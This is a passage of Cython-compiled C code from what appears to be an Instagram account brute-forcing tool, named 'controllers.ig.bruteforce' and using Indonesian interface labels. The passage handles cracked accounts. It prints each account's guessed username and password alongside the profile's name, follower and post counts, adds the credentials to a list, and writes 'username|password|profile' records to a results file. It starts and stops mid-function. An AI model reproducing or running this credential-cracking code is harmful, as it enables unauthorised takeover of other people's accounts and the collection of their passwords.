            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_1 = PyTuple_New(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 273, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_8 = 0;
            __pyx_t_16 = 127;
            __Pyx_INCREF(__pyx_kp_u_bold_yellow);
            __pyx_t_8 += 13;
            __Pyx_GIVEREF(__pyx_kp_u_bold_yellow);
            PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_bold_yellow);
            __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_username); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 273, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_14 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_10), __pyx_empty_unicode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 273, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_16 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) > __pyx_t_16) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) : __pyx_t_16;
            __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_14);
            __Pyx_GIVEREF(__pyx_t_14);
            PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_14);
            __pyx_t_14 = 0;
            __Pyx_INCREF(__pyx_kp_u__16);
            __pyx_t_8 += 1;
            __Pyx_GIVEREF(__pyx_kp_u__16);
            PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__16);
            __pyx_t_14 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_password); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 273, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_14);
            __pyx_t_10 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_14), __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 273, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __pyx_t_16 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_16) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_16;
            __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
            __Pyx_GIVEREF(__pyx_t_10);
            PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_10);
            __pyx_t_10 = 0;
            __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_1, 4, __pyx_t_8, __pyx_t_16); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 273, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_1)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_1);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
              }
            }
            __pyx_t_11 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_1, __pyx_t_10) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_10);
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 273, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

             
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_root, __pyx_n_s_add); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 274, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_v_profile, __pyx_n_u_name); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 274, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_1 = __Pyx_PyUnicode_FormatSafe(__pyx_kp_u_Nama_bold_yellow_s, __pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 274, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_10)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_10);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
              }
            }
            __pyx_t_11 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_10, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_1);
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 274, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

             
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_root, __pyx_n_s_add); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 275, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_profile, __pyx_n_u_followers); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 275, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_10 = __Pyx_PyUnicode_FormatSafe(__pyx_kp_u_Pengikut_bold_yellow_s, __pyx_t_1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 275, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_1)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_1);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
              }
            }
            __pyx_t_11 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_1, __pyx_t_10) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_10);
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 275, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

             
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_root, __pyx_n_s_add); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 276, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_v_profile, __pyx_n_u_following); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 276, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_1 = __Pyx_PyUnicode_FormatSafe(__pyx_kp_u_Mengikuti_bold_yellow_s, __pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 276, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_10)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_10);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
              }
            }
            __pyx_t_11 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_10, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_1);
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 276, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

             
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_root, __pyx_n_s_add); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 277, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_profile, __pyx_n_u_media); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 277, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_10 = __Pyx_PyUnicode_FormatSafe(__pyx_kp_u_Postingan_bold_yellow_s, __pyx_t_1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 277, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_1)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_1);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
              }
            }
            __pyx_t_11 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_1, __pyx_t_10) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_10);
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 277, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

             
            goto __pyx_L21;
          }

           
            {
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_tree); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 279, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_10 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_10)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_10);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
              }
            }
            __pyx_t_11 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_10, __pyx_kp_u__6) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_kp_u__6);
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 279, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_XDECREF_SET(__pyx_v_root, __pyx_t_11);
            __pyx_t_11 = 0;

             
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_root, __pyx_n_s_add); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 280, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_10 = PyTuple_New(4); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 280, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_8 = 0;
            __pyx_t_16 = 127;
            __Pyx_INCREF(__pyx_kp_u_bold_yellow);
            __pyx_t_8 += 13;
            __Pyx_GIVEREF(__pyx_kp_u_bold_yellow);
            PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_kp_u_bold_yellow);
            __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_username); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 280, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_14 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_1), __pyx_empty_unicode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 280, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_16 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) > __pyx_t_16) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) : __pyx_t_16;
            __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_14);
            __Pyx_GIVEREF(__pyx_t_14);
            PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_t_14);
            __pyx_t_14 = 0;
            __Pyx_INCREF(__pyx_kp_u__16);
            __pyx_t_8 += 1;
            __Pyx_GIVEREF(__pyx_kp_u__16);
            PyTuple_SET_ITEM(__pyx_t_10, 2, __pyx_kp_u__16);
            __pyx_t_14 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_password); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 280, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_14);
            __pyx_t_1 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_14), __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 280, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __pyx_t_16 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_16) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_16;
            __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
            __Pyx_GIVEREF(__pyx_t_1);
            PyTuple_SET_ITEM(__pyx_t_10, 3, __pyx_t_1);
            __pyx_t_1 = 0;
            __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_10, 4, __pyx_t_8, __pyx_t_16); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 280, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_10)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_10);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
              }
            }
            __pyx_t_11 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_10, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_1);
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 280, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

             
            __pyx_t_11 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 281, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_12 = __Pyx_PyObject_Dict_GetItem(__pyx_v_users, __pyx_n_u_name); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 281, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_12);
            if (PyDict_SetItem(__pyx_t_11, __pyx_n_s_name, __pyx_t_12) < 0) __PYX_ERR(0, 281, __pyx_L5_error)
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_XDECREF_SET(__pyx_v_profile, __pyx_t_11);
            __pyx_t_11 = 0;
          }
          __pyx_L21:;

           
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_print); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 283, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_1 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_1)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_1);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
            }
          }
          __pyx_t_11 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_1, __pyx_v_root) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_v_root);
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 283, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

           
          __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_CP); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 284, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_12 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 284, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_users, __pyx_n_u_username); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 284, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_1);
          if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_username, __pyx_t_1) < 0) __PYX_ERR(0, 284, __pyx_L5_error)
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_password); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 284, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_1);
          if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_password, __pyx_t_1) < 0) __PYX_ERR(0, 284, __pyx_L5_error)
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_17 = __Pyx_PyObject_Append(__pyx_t_11, __pyx_t_12); if (unlikely(__pyx_t_17 == ((int)-1))) __PYX_ERR(0, 284, __pyx_L5_error)
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

           
          __pyx_t_12 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_username); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 285, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_11 = __Pyx_PyObject_Dict_GetItem(__pyx_v_login, __pyx_n_u_password); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 285, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_json); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 285, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_dumps); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 285, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          __pyx_t_10 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 285, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_10);
          if (PyDict_SetItem(__pyx_t_10, __pyx_n_s_profile, __pyx_v_profile) < 0) __PYX_ERR(0, 285, __pyx_L5_error)
          __pyx_t_13 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_14))) {
            __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_14);
            if (likely(__pyx_t_13)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
              __Pyx_INCREF(__pyx_t_13);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_14, function);
            }
          }
          __pyx_t_1 = (__pyx_t_13) ? __Pyx_PyObject_Call2Args(__pyx_t_14, __pyx_t_13, __pyx_t_10) : __Pyx_PyObject_CallOneArg(__pyx_t_14, __pyx_t_10);
          __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 285, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = PyList_New(3); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 285, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_GIVEREF(__pyx_t_12);
          PyList_SET_ITEM(__pyx_t_14, 0, __pyx_t_12);
          __Pyx_GIVEREF(__pyx_t_11);
          PyList_SET_ITEM(__pyx_t_14, 1, __pyx_t_11);
          __Pyx_GIVEREF(__pyx_t_1);
          PyList_SET_ITEM(__pyx_t_14, 2, __pyx_t_1);
          __pyx_t_12 = 0;
          __pyx_t_11 = 0;
          __pyx_t_1 = 0;
          __Pyx_XDECREF_SET(__pyx_v_account, ((PyObject*)__pyx_t_14));
          __pyx_t_14 = 0;

           
          __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_utils); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 286, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_save_result); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 286, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_CP_FILES_SAVED); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 286, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_12 = PyUnicode_Join(__pyx_kp_u__16, __pyx_v_account); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 286, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_10 = NULL;
          __pyx_t_15 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
            __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_11);
            if (likely(__pyx_t_10)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
              __Pyx_INCREF(__pyx_t_10);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_11, function);
              __pyx_t_15 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_11)) {
            PyObject *__pyx_temp[3] = {__pyx_t_10, __pyx_t_1, __pyx_t_12};
            __pyx_t_14 = __Pyx_PyFunction_FastCall(__pyx_t_11, __pyx_temp+1-__pyx_t_15, 2+__pyx_t_15); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 286, __pyx_L5_error)
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_11)) {
            PyObject *__pyx_temp[3] = {__pyx_t_10, __pyx_t_1, __pyx_t_12};
            __pyx_t_14 = __Pyx_PyCFunction_FastCall(__pyx_t_11, __pyx_temp+1-__pyx_t_15, 2+__pyx_t_15); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 286, __pyx_L5_error)
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          } else
          #endif
          {
            __pyx_t_13 = PyTuple_New(2+__pyx_t_15); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 286, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_13);
            if (__pyx_t_10) {
              __Pyx_GIVEREF(__pyx_t_10); PyTuple_SET_ITEM(__pyx_t_13, 0, __pyx_t_10); __pyx_t_10 = NULL;
            }
            __Pyx_GIVEREF(__pyx_t_1);
            PyTuple_SET_ITEM(__pyx_t_13, 0+__pyx_t_15, __pyx_t_1);
            __Pyx_GIVEREF(__pyx_t_12);
            PyTuple_SET_ITEM(__pyx_t_13, 1+__pyx_t_15, __pyx_t_12);
            __pyx_t_1 = 0;
            __pyx_t_12 = 0;
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_11, __pyx_t_13, NULL); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 286, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          }
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

           
          goto __pyx_L10_try_break;

           
        }

         
      }
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L12_try_end;
      __pyx_L5_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;

       
        {
        __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base._brute", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_14, &__pyx_t_11, &__pyx_t_13) < 0) __PYX_ERR(0, 288, __pyx_L7_except_error)
        __Pyx_GOTREF(__pyx_t_14);
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_GOTREF(__pyx_t_13);

         
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_traceback); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 289, __pyx_L7_except_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_print_exc); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 289, __pyx_L7_except_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_10);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
